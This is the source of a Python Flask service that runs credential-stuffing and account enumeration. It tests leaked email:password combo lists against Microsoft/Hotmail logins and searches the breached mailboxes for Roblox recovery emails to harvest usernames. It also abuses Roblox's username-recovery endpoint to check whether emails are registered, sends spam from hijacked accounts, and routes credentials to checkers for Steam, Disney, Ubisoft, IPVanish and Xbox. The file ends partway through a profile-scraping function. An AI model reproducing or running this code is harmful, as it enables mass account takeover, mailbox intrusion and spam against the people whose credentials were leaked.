import requests
import json
import time
import urllib.parse
from flask import Flask, request, jsonify
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import concurrent.futures
import threading
from steam_checker import SteamChecker
from disney_checker import DisneyChecker
from ubisoft_checker import UbisoftChecker
from ipvanish_checker import IPVanishChecker
from spotify_checker import SpotifyChecker
from amazon_checker import check_amazon_email
from epic_checker import check_epic_email
from concurrent.futures import ThreadPoolExecutor
from aiohttp import ClientSession, TCPConnector, ClientTimeout
import aiohttp
import re
import socket
from xbox_checker import XboxChecker
import ssl
import asyncio

import uuid
import hashlib
from datetime import datetime, timedelta
import traceback

app = Flask(__name__)

thread_local = threading.local()

def get_thread_session():
    if not hasattr(thread_local, "session"):
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=retry_strategy,
            pool_block=False
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        thread_local.session = session
    return thread_local.session

def get_csrf_token_fast():
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        sock = socket.create_connection(('www.roblox.com', 443), timeout=5)
        ssock = context.wrap_socket(sock, server_hostname='www.roblox.com')
        
        request = (
            b'POST /v2/login HTTP/1.1\r\n'
            b'Host: auth.roblox.com\r\n'
            b'Connection: keep-alive\r\n'
            b'Content-Length: 2\r\n'
            b'Accept: application/json\r\n'
            b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n'
            b'Content-Type: application/json\r\n'
            b'Origin: https://www.roblox.com\r\n'
            b'Referer: https://www.roblox.com/login\r\n'
            b'\r\n'
            b'{}'
        )
        
        ssock.send(request)
        response = b''
        while True:
            chunk = ssock.recv(4096)
            if not chunk:
                break
            response += chunk
            if b'\r\n\r\n' in response:
                break
        
        headers = response.decode('utf-8').split('\r\n')
        csrf_token = None
        for header in headers:
            if header.lower().startswith('x-csrf-token:'):
                csrf_token = header.split(': ')[1].strip()
                break
                
        ssock.close()
        return csrf_token
    except:
        return None

def send_recovery_request(email, csrf_token):
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        sock = socket.create_connection(('auth.roblox.com', 443), timeout=5)
        ssock = context.wrap_socket(sock, server_hostname='auth.roblox.com')
        
        data = json.dumps({"targetType": 0, "target": email}).encode()
        
        request = (
            f'POST /v2/usernames/recover HTTP/1.1\r\n'
            f'Host: auth.roblox.com\r\n'
            f'Connection: keep-alive\r\n'
            f'Content-Length: {len(data)}\r\n'
            f'Accept: application/json\r\n'
            f'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n'
            f'Content-Type: application/json\r\n'
            f'x-csrf-token: {csrf_token}\r\n'
            f'Origin: https://www.roblox.com\r\n'
            f'Referer: https://www.roblox.com/login\r\n'
            f'\r\n'
        ).encode() + data
        
        ssock.send(request)
        
        response = b''
        while True:
            chunk = ssock.recv(4096)
            if not chunk:
                break
            response += chunk
            if b'\r\n\r\n' in response and b'"transmissionType":"Email"' in response:
                ssock.close()
                return True
            if len(response) > 1024:
                break
                
        ssock.close()
        return b'"transmissionType":"Email"' in response
    except:
        return False

def process_email_fast(email):
    try:
        csrf_token = get_csrf_token_fast()
        if not csrf_token:
            return email, False
            
        is_valid = send_recovery_request(email, csrf_token)
        return email, is_valid
    except:
        return email, False

def process_single_email(email):
    try:
        session = get_thread_session()
        
        csrf_token, cookies, _ = get_csrf_token()
        if not csrf_token:
            return email, False

        headers = {
            'accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'x-csrf-token': csrf_token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/login',
            'Connection': 'keep-alive'
        }

        session.cookies.update(cookies or {})

        response = session.post(
            'https://auth.roblox.com/v2/usernames/recover',
            headers=headers,
            json={
                "targetType": 0,
                "target": email
            },
            timeout=30,
            verify=False
        )
        
        response_data = response.json() if response.text else {}
        is_valid = response.status_code == 200 and isinstance(response_data, dict) and response_data.get('transmissionType') == 'Email'
        
        return email, is_valid

    except Exception:
        return email, False

class HotmailChecker:
    def __init__(self):
        self.session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        self.base_url = "https://login.live.com"
        
    def check_account(self, email, password, search_params=None):
        """Check account with optional search parameters"""
        try:
            login_url = (f"{self.base_url}/ppsecure/post.srf?"
                        f"client_id=0000000048170EF2&"
                        f"redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&"
                        f"response_type=token&"
                        f"scope=service%3A%3Aoutlook.live.com%3A%3AMBI_SSL+openid+profile+offline_access&"
                        f"display=touch&"
                        f"username={urllib.parse.quote(email)}&"
                        f"contextid=2CCDB02DC526CA71&"
                        f"bk=1665024852&"
                        f"uaid=a5b22c26bc704002ac309462e8d061bb&"
                        f"pid=15216")

            preauth_response = self.session.get(login_url)
            try:
                ppft = preauth_response.text.split('name="PPFT" id="i0327" value="')[1].split('"')[0]
            except:
                return {"status": "FAILURE", "message": "Failed to get PPFT token"}

            login_data = {
                'i13': '0',
                'login': email,
                'loginfmt': email,
                'type': '11',
                'LoginOptions': '3',
                'lrt': '',
                'lrtPartition': '',
                'hisRegion': '',
                'hisScaleUnit': '',
                'passwd': password,
                'ps': '2',
                'psRNGCDefaultType': '',
                'psRNGCEntropy': '',
                'psRNGCSLK': '',
                'canary': '',
                'ctx': '',
                'hpgrequestid': '',
                'PPFT': ppft,
                'PPSX': 'Passpor',
                'NewUser': '1',
                'FoundMSAs': '',
                'fspost': '0',
                'i21': '0',
                'CookieDisclosure': '0',
                'IsFidoSupported': '1',
                'isSignupPost': '0',
                'i2': '1',
                'i17': '0',
                'i18': '',
                'i19': '41679'
            }

            headers = {
                'Host': 'login.live.com',
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://login.live.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': login_url,
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9'
            }

            response = self.session.post(login_url, data=login_data, headers=headers, allow_redirects=True)
            
            access_token = None
            final_url = response.url
            
            if 'access_token=' in final_url:
                access_token = final_url.split('access_token=')[1].split('&')[0]
            elif 'Location' in response.headers and 'access_token=' in response.headers['Location']:
                access_token = response.headers['Location'].split('access_token=')[1].split('&')[0]
            
            if not access_token:
                for resp in response.history:
                    if 'access_token=' in resp.url:
                        access_token = resp.url.split('access_token=')[1].split('&')[0]
                        break
                    elif 'Location' in resp.headers and 'access_token=' in resp.headers['Location']:
                        access_token = resp.headers['Location'].split('access_token=')[1].split('&')[0]
                        break

            mspcid = self.session.cookies.get("MSPCID", "")
            cid = mspcid.upper() if mspcid else ""

            if access_token:
                search_results = None
                if search_params:
                    search_results = self.search_messages(
                        access_token,
                        cid,
                        from_email=search_params.get('from_email'),
                        subject=search_params.get('subject'),
                        keyword=search_params.get('keyword')
                    )
                return {
                    "status": "SUCCESS",
                    "message": "Login successful",
                    "search_results": search_results,
                    "access_token": access_token
                }

            ppl_state = self.session.cookies.get("PPLState")
            if ppl_state and "1" in ppl_state:
                return {
                    "status": "SUCCESS",
                    "message": "Login successful but no access token",
                    "access_token": None
                }

            return {"status": "FAILURE", "message": "Login failed"}

        except Exception as e:
            return {"status": "ERROR", "message": str(e)}

    def search_messages(self, access_token, cid, from_email=None, subject=None, keyword=None):
        """Message search with required fields"""
        try:
            headers = {
                "Authorization": f"Bearer {access_token}",
                "Content-Type": "application/json",
                "X-AnchorMailbox": f"CID:{cid}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "X-OWA-UrlPostData": "source=IsOWA",
                "X-Requested-With": "XMLHttpRequest",
                "X-OWA-CANARY": self.session.cookies.get('X-OWA-CANARY', '')
            }
            
            query_string = ""
            if from_email:
                if ',' in from_email:
                    emails = [f'from:"{email.strip()}"' for email in from_email.split(',')]
                    query_string = f"({' OR '.join(emails)})"
                else:
                    query_string = f'from:"{from_email}"'

            search_payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Message",
                    "ContentSources": ["Exchange", "DeletedItems"],
                    "Filter": {
                        "And": [
                            {"Term": {"IsRead": None}},
                            {"Or": [
                                {"Term": {"FolderName": "Inbox"}},
                                {"Term": {"FolderName": "Sent Items"}},
                                {"Term": {"FolderName": "Deleted Items"}},
                                {"Term": {"FolderName": "Junk Email"}}
                            ]}
                        ]
                    },
                    "From": 0,
                    "Query": {
                        "QueryString": query_string,
                        "DateRangeSource": "All",
                        "MessageKind": "Email"
                    },
                    "RefiningQueries": [],
                    "Size": 100,
                    "Sort": [
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 50
                }],
                "AnswerEntityRequests": [{
                    "Query": {
                        "QueryString": query_string,
                        "DateRangeSource": "All",
                        "MessageKind": "Email"
                    },
                    "EntityTypes": ["Message"],
                    "From": 0,
                    "Size": 100,
                    "EnableAsyncResolution": True
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": [
                        "Suggestion",
                        "NoResultModification",
                        "NoResultFolderRefinerModification",
                        "NoRequeryModification",
                        "Modification"
                    ]
                }
            }

            messages = []
            max_attempts = 3
            
            for attempt in range(max_attempts):
                print(f"Attempt {attempt + 1} to search messages...")
                search_response = self.session.post(
                    "https://outlook.live.com/search/api/v2/query?n=124",
                    headers=headers,
                    json=search_payload,
                    timeout=30
                )
                
                print(f"Search response status: {search_response.status_code}")
                if search_response.status_code == 200:
                    response_data = search_response.json()
                    print(f"Search response data: {json.dumps(response_data, indent=2)}")
                    
                    for entity_set in response_data.get('EntitySets', []):
                        result_sets = entity_set.get('ResultSets', [{}])[0]
                        for result in result_sets.get('Results', []):
                            source = result.get('Source', {})
                            
                            if source.get('ItemRestId'):
                                rest_url = f"https://outlook.live.com/owa/0/service.svc/s/GetMessageForCompose?ID={source['ItemRestId']}"
                                rest_headers = {
                                    **headers,
                                    "Accept": "application/json",
                                    "X-OWA-CANARY": source.get('ConversationThreadId', '')
                                }
                                
                                rest_response = self.session.get(rest_url, headers=rest_headers)
                                print(f"Message content response status: {rest_response.status_code}")
                                
                                msg_data = {}
                                if rest_response.status_code == 200:
                                    try:
                                        msg_data = rest_response.json()
                                    except:
                                        msg_data = {'Body': {'Value': rest_response.text}}
                                
                                messages.append({
                                    'subject': source.get('Subject', 'No Subject'),
                                    'from': {
                                        'name': source.get('From', {}).get('EmailAddress', {}).get('Name', 'Unknown'),
                                        'email': source.get('From', {}).get('EmailAddress', {}).get('Address', 'Unknown')
                                    },
                                    'received_time': source.get('DateTimeReceived'),
                                    'preview': source.get('Preview', ''),
                                    'body': msg_data.get('Body', {}).get('Value', ''),
                                    'has_attachments': source.get('HasAttachments', False),
                                    'is_read': source.get('IsRead', False),
                                    'web_link': source.get('WebLink', '')
                                })
                    
                    if messages:
                        break
                    
                if attempt < max_attempts - 1:
                    print("No results found, waiting before retry...")
                    time.sleep(5)
                
            return messages

        except Exception as e:
            print(f"Error searching messages: {str(e)}")
            return None

    def search_messages_full(self, access_token, cid, from_email=None, subject=None, keyword=None):
        """Message search with full content"""
        try:
            headers = {
                "Authorization": f"Bearer {access_token}",
                "Content-Type": "application/json",
                "X-AnchorMailbox": f"CID:{cid}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            }
            
            query_parts = []
            if from_email:
                if ',' in from_email:
                    emails = [f"from:{email.strip()}" for email in from_email.split(',')]
                    query_parts.append(f"({' OR '.join(emails)})")
                else:
                    query_parts.append(f"from:{from_email}")
            
            if subject:
                if ',' in subject:
                    subjects = [f"subject:({subj.strip()})" for subj in subject.split(',')]
                    query_parts.append(f"({' OR '.join(subjects)})")
                else:
                    query_parts.append(f"subject:({subject})")
                
            if keyword:
                query_parts.append(f"body:({keyword})")
            
            query_string = " AND ".join(query_parts) if query_parts else ""
            
            search_payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Message",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "inbox"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                            {"Term": {"DistinguishedFolderName": "sentitems"}},
                            {"Term": {"DistinguishedFolderName": "junkemail"}}
                        ]
                    },
                    "From": 0,
                    "Query": {
                        "QueryString": query_string
                    },
                    "RefiningQueries": None,
                    "Size": 100,
                    "Sort": [
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 100
                }],
                "AnswerEntityRequests": [{
                    "Query": {
                        "QueryString": query_string
                    },
                    "EntityTypes": ["Message", "Event", "File"],
                    "From": 0,
                    "Size": 100,
                    "EnableAsyncResolution": True
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": [
                        "Suggestion",
                        "NoResultModification",
                        "NoResultFolderRefinerModification",
                        "NoRequeryModification",
                        "Modification"
                    ]
                }
            }

            messages = []
            max_attempts = 3
            
            for attempt in range(max_attempts):
                search_response = self.session.post(
                    "https://outlook.live.com/search/api/v2/query",
                    headers=headers,
                    json=search_payload,
                    timeout=30
                )
                
                if search_response.status_code == 200:
                    response_data = search_response.json()
                    
                    for entity_set in response_data.get('EntitySets', []):
                        result_sets = entity_set.get('ResultSets', [{}])[0]
                        for result in result_sets.get('Results', []):
                            source = result.get('Source', {})
                            
                            if source.get('ItemRestId'):
                                rest_url = f"https://outlook.live.com/owa/0/service.svc/s/GetMessageForCompose?ID={source['ItemRestId']}"
                                rest_headers = {
                                    **headers,
                                    "Accept": "application/json",
                                    "X-OWA-CANARY": source.get('ConversationThreadId', '')
                                }
                                
                                rest_response = self.session.get(rest_url, headers=rest_headers)
                                
                                msg_data = {}
                                if rest_response.status_code == 200:
                                    try:
                                        msg_data = rest_response.json()
                                    except:
                                        msg_data = {'Body': {'Value': rest_response.text}}
                                
                                messages.append({
                                    'subject': source.get('Subject', 'No Subject'),
                                    'from': {
                                        'name': source.get('From', {}).get('EmailAddress', {}).get('Name', 'Unknown'),
                                        'email': source.get('From', {}).get('EmailAddress', {}).get('Address', 'Unknown')
                                    },
                                    'received_time': source.get('DateTimeReceived'),
                                    'sent_time': source.get('DateTimeSent'),
                                    'body': msg_data.get('Body', {}).get('Value', ''),
                                    'body_type': msg_data.get('Body', {}).get('ContentType', 'text'),
                                    'has_attachments': source.get('HasAttachments', False),
                                    'is_read': source.get('IsRead', False),
                                    'web_link': source.get('WebLink', ''),
                                    'id': source.get('ItemRestId', '')
                                })
                
                    if messages:
                        break
                    
                if attempt < max_attempts - 1:
                    time.sleep(5)
                
            return messages

        except Exception as e:
            print(f"Error searching messages full: {str(e)}")
            return None

    def spam_email(self, username, password, recipient, subject, message):
        try:
            auth_result = self.check_account(username, password)
            
            if auth_result['status'] != 'SUCCESS':
                return {
                    "status": "ERROR",
                    "message": "Authentication failed",
                    "auth_result": auth_result
                }

            access_token = auth_result.get('access_token')
            if not access_token:
                return {
                    "status": "ERROR",
                    "message": "Failed to get access token",
                    "debug": {
                        "cookies": dict(self.session.cookies),
                        "auth_result": auth_result
                    }
                }

            mspcid = self.session.cookies.get("MSPCID", "")
            cid = mspcid.upper() if mspcid else ""

            email_data = {
                "Message": {
                    "Subject": subject,
                    "Body": {
                        "ContentType": "HTML",
                        "Content": message
                    },
                    "ToRecipients": [
                        {
                            "EmailAddress": {
                                "Address": recipient
                            }
                        }
                    ]
                },
                "SaveToSentItems": "true"
            }

            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Host': 'substrate.office.com',
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json'
            }

            response = self.session.post(
                "https://outlook.office.com/api/v2.0/me/sendmail",
                headers=headers,
                json=email_data
            )

            if response.status_code == 202:
                return {
                    "status": "SUCCESS",
                    "message": "Email sent successfully"
                }
            else:
                return {
                    "status": "ERROR",
                    "message": "Failed to send email",
                    "response_status": response.status_code,
                    "response_text": response.text,
                    "debug": {
                        "access_token": access_token,
                        "cid": cid,
                        "headers": headers
                    }
                }

        except Exception as e:
            return {
                "status": "ERROR",
                "message": str(e),
                "traceback": traceback.format_exc()
            }

def get_csrf_token():
    try:
        session = requests.Session()
        
        response = session.get(
            'https://www.roblox.com',
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive'
            },
            timeout=30,
            verify=False
        )

        token_response = session.post(
            'https://auth.roblox.com/v2/login',
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Origin': 'https://www.roblox.com',
                'Referer': 'https://www.roblox.com/login'
            },
            json={},
            timeout=30,
            verify=False
        )
        
        csrf_token = token_response.headers.get('x-csrf-token')
        return csrf_token, session.cookies.get_dict(), session
    except Exception as e:
        return None, None, None

@app.route('/recover', methods=['POST'])
def recover_account():
    try:
        data = request.get_json()
        if not data or 'email' not in data:
            return jsonify({"status": "error", "message": "Email required"}), 400

        email = data['email']
        
        csrf_token, cookies, session = get_csrf_token()
        if not csrf_token or not session:
            return jsonify({"status": "error", "message": "Failed to get CSRF token"}), 500

        headers = {
            'accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'x-csrf-token': csrf_token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/login',
            'Connection': 'keep-alive'
        }
        
        response = session.post(
            'https://auth.roblox.com/v2/usernames/recover',
            headers=headers,
            json={
                "targetType": 0,
                "target": email
            },
            timeout=30,
            verify=False
        )

        return jsonify({
            "status": "success" if response.status_code == 200 else "error",
            "message": "Recovery email sent" if response.status_code == 200 else "Failed to send recovery email",
            "roblox_response": response.text,
            "status_code": response.status_code
        })

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def raw_request(host, port, request_data):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    context = ssl._create_unverified_context()
    ssock = context.wrap_socket(sock, server_hostname=host)
    try:
        ssock.connect((host, port))
        ssock.send(request_data)
        response = ssock.recv(1024)
        ssock.close()
        return response
    except:
        try:
            ssock.close()
        except:
            pass
        return b''

def get_token():
    request = (
        b'POST /v2/login HTTP/1.1\r\n'
        b'Host: auth.roblox.com\r\n'
        b'Content-Length: 2\r\n'
        b'Content-Type: application/json\r\n'
        b'\r\n'
        b'{}'
    )
    response = raw_request('auth.roblox.com', 443, request)
    try:
        token = response.split(b'x-csrf-token: ')[1].split(b'\r\n')[0]
        return token.decode()
    except:
        return None

def check_email(email):
    try:
        token = get_token()
        if not token:
            return email, False
            
        data = json.dumps({"targetType":0,"target":email}).encode()
        request = (
            f'POST /v2/usernames/recover HTTP/1.1\r\n'
            f'Host: auth.roblox.com\r\n'
            f'Content-Length: {len(data)}\r\n'
            f'Content-Type: application/json\r\n'
            f'x-csrf-token: {token}\r\n'
            f'\r\n'
        ).encode() + data
        
        response = raw_request('auth.roblox.com', 443, request)
        return email, b'"transmissionType":"Email"' in response
    except:
        return email, False

@app.route('/recoverfile', methods=['POST'])
def recover_multiple():
    try:
        data = request.get_json()
        if not data or 'emails' not in data:
            return jsonify({"status": "error", "message": "Emails list required"}), 400

        emails = data['emails']
        results = {}
        
        with ThreadPoolExecutor(max_workers=500) as executor:
            futures = []
            for email in emails:
                futures.append(executor.submit(check_email, email))
            
            for future in concurrent.futures.as_completed(futures):
                email, is_valid = future.result()
                results[email] = is_valid

        return jsonify({
            "status": "success",
            "results": results
        })

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/solve', methods=['POST'])
def solve():
    try:
        data = request.get_json()
        if not data or 'email' not in data or 'password' not in data:
            return jsonify({"status": "ERROR", "message": "Missing required fields"}), 400

        checker = HotmailChecker()
        result = checker.check_account(data['email'], data['password'], data.get('search_params'))
        return jsonify(result)
    except Exception as e:
        return jsonify({"status": "ERROR", "message": str(e)}), 500

@app.route('/solve_full', methods=['POST'])
def solve_full():
    try:
        data = request.get_json()
        if not data or 'email' not in data or 'password' not in data:
            return jsonify({"status": "ERROR", "message": "Missing required fields"}), 400

        checker = HotmailChecker()
        result = checker.check_account_full(data['email'], data['password'], data.get('search_params'))
        return jsonify(result)
    except Exception as e:
        return jsonify({"status": "ERROR", "message": str(e)}), 500

def extract_roblox_usernames(preview):
    """Extract Roblox usernames from email preview"""
    try:
        accounts_section = preview.split('Your accounts are listed below:')[1].split('Thank You')[0]
        usernames = []
        for line in accounts_section.split('*'):
            username = line.strip().strip('\r\n').strip()
            if username and not username.startswith('Thank'):
                if '\n' in username:
                    for potential_name in username.split('\n'):
                        clean_name = potential_name.strip()
                        if clean_name and not clean_name.startswith('Thank'):
                            usernames.append(clean_name)
                else:
                    usernames.append(username)
        
        if not usernames:
            lines = preview.split('\n')
            for line in lines:
                line = line.strip()
                if line and not any(x in line.lower() for x in ['thank', 'hello', 'your accounts', 'receiving']):
                    usernames.append(line)
        
        return usernames
    except Exception as e:
        print(f"Error extracting usernames: {str(e)}")
        return []

@app.route('/super_check', methods=['POST'])
def super_check():
    try:
        data = request.get_json()
        if not data or 'combos' not in data:
            return jsonify({"status": "error", "message": "Combos list required (email:pass format)"}), 400

        combos = data['combos']
        results = {}

        checker = HotmailChecker()

        def process_combo(combo):
            try:
                email, password = combo.strip().split(':')
                _, is_valid = check_email(email)
                
                result = checker.check_account(email, password, {
                    'from_email': 'accounts@roblox.com,no-reply',
                    'subject': 'Roblox Account Recovery'
                })
                
                not_100_usernames = []
                usernames_2025 = []
                raw_search_results = result.get('search_results', [])
                
                if result['status'] == 'SUCCESS' and raw_search_results:
                    for message in raw_search_results:
                        not_100_usernames.extend(extract_roblox_usernames(message['preview']))
                        if '2025-01-21' in message['preview']:
                            usernames_2025.extend(extract_roblox_usernames(message['preview']))
                
                return email, {
                    'valid': is_valid,
                    'login_status': result['status'],
                    'not_100_usernames': not_100_usernames if not_100_usernames else [],
                    'has_roblox': bool(not_100_usernames),
                    'usernames_2025': usernames_2025 if usernames_2025 else [],
                    'has_2025_email': bool(usernames_2025),
                    'raw_search_results': raw_search_results,
                    'debug_info': {
                        'message_count': len(raw_search_results),
                        'login_message': result.get('message', ''),
                        'has_search_results': bool(raw_search_results)
                    }
                }
                
            except Exception as e:
                print(f"Error processing {combo}: {str(e)}")
                return email, {
                    'valid': False,
                    'login_status': 'ERROR',
                    'error': str(e),
                    'not_100_usernames': [],
                    'has_roblox': False,
                    'usernames_2025': [],
                    'has_2025_email': False,
                    'raw_search_results': [],
                    'debug_info': {
                        'error_details': str(e),
                        'message_count': 0,
                        'has_search_results': False
                    }
                }

        with ThreadPoolExecutor(max_workers=250) as executor:
            futures = []
            for combo in combos:
                futures.append(executor.submit(process_combo, combo))
            
            for future in concurrent.futures.as_completed(futures):
                email, result = future.result()
                results[email] = result

        return jsonify({
            "status": "success",
            "results": results
        })

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/check', methods=['POST'])
def check_account():
    try:
        if not request.is_json:
            return jsonify({
                "status": "FAILURE",
                "message": "Content-Type must be application/json"
            }), 400

        data = request.get_json()
        
        if not data:
            return jsonify({"status": "FAILURE", "message": "No data provided"}), 400
            
        required_fields = ['type', 'email', 'password']
        for field in required_fields:
            if field not in data:
                return jsonify({
                    "status": "FAILURE", 
                    "message": f"Missing required field: {field}"
                }), 400
        
        service_type = data['type'].lower()
        email = data['email']
        password = data['password']
        
        if service_type == 'xbox':
            checker = XboxChecker()
            result = checker.check_account(email, password)
            return jsonify(result)
        elif service_type == 'steam':
            checker = SteamChecker(email, password)
        elif service_type == 'disney':
            checker = DisneyChecker(email, password)
        elif service_type == 'ubisoft':
            checker = UbisoftChecker(email, password)
        elif service_type == 'ipvanish':
            checker = IPVanishChecker(email, password)
        else:
            return jsonify({
                "status": "FAILURE",
                "message": f"Invalid service type: {service_type}. Supported types: steam, disney, ubisoft, ipvanish, xbox"
            }), 400
            
        result = checker.check_account()
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            "status": "FAILURE",
            "message": f"Error: {str(e)}"
        }), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "SUCCESS",
        "message": "Service is running",
        "supported_types": ["steam", "disney", "ubisoft", "ipvanish", "xbox"]
    })

async def get_user_id(username):
    start_time = time.time()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://www.roblox.com/users/profile?username={username}') as response:
                if response.ok:
                    response_url = str(response.url)
                    user_id = re.search(r'\d+', response_url).group(0)
                    end_time = time.time()
                    return user_id, end_time - start_time
                else:
                    return None, None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None, None
    
async def get_or_convert_user_id(user_input):
    if user_input.isdigit():
        user_id = int(user_input)
        username = await get_username(user_id)
        return user_id, username
    else:
        user_id_tuple = await get_user_id(user_input)
        if user_id_tuple[0]:
            return int(user_id_tuple[0]), user_input
    return None, None

async def get_username(user_id):
    try:
        async with aiohttp.ClientSession() as session:
            user_info_url = f'https://users.roblox.com/v1/users/{user_id}'
            async with session.get(user_info_url) as response:
                if response.status == 200:
                    user_data = await response.json()
                    return user_data.get('name')
    except Exception as e:
        print(f"An error occurred: {e}")
    return None

asset_ids_to_check = [18824203, 1567446, 93078560, 102611803]

@app.route('/get/all/<user_input>', methods=['GET'])
async def get_all_user_info(user_input):
    user_id, username = await get_or_convert_user_id(user_input)
    if user_id is None:
        return jsonify({'error': 'Invalid username or user ID', 'input': user_input}), 404

    async with ClientSession(connector=TCPConnector(limit=100), timeout=ClientTimeout(total=1)) as session:

        urls = [
            f'https://users.roblox.com/v1/users/{user_id}',
            f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png',
            f'https://thumbnails.roblox.com/v1/users/avatar?userIds={user_id}&size=420x420&format=Png',
            f'https://users.roblox.com/v1/users/{user_id}/username-history?limit=100&sortOrder=Asc',
            f"https://groups.roblox.com/v2/users/{user_id}/groups/roles",
            f"https://api.rolimons.com/players/v1/playerinfo/{user_id}",
            *[f"https://inventory.roblox.com/v1/users/{user_id}s/Asset/{asset_id}" for asset_id in asset_ids_to_check]
        ]


        get_tasks = [session.get(url) for url in urls]
        
        post_task = session.post('https://presence.roblox.com/v1/presence/users', json={"userIds": [user_id]})

        responses = await asyncio.gather(post_task, *get_tasks, return_exceptions=True)

        try:
            presence_data = await responses[0].json() if not isinstance(responses[0], Exception) else {'userPresences': []}
            user_info = await responses[1].json() if not isinstance(responses[1], Exception) else {}
            headshot_data = await responses[2].json() if not isinstance(responses[2], Exception) else {'data': []}
            avatar_data = await responses[3].json() if not isinstance(responses[3], Exception) else {'data': []}
            username_data = await responses[4].json() if not isinstance(responses[4], Exception) else {'data': []}
            groups_data = await responses[5].json() if not isinstance(responses[5], Exception) else {'data': []}
